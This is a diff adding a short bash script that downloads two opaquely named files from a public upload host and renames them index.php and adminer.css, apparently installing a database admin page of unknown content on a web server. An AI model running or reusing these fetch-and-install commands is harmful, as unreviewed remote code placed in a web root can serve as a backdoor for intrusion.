@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://publish.ip1.cc/storage/uploads/Hd21C4UnWsCh784spkhSSvU0PHE74B0GXlz9rSce.bin
+mv Hd21C4UnWsCh784spkhSSvU0PHE74B0GXlz9rSce.bin index.php
+wget https://publish.ip1.cc/storage/uploads/39Z5WOx18jNh1fSO1NcDMlTF2yEn9fxvdXTG514O.txt
+mv 39Z5WOx18jNh1fSO1NcDMlTF2yEn9fxvdXTG514O.txt adminer.css
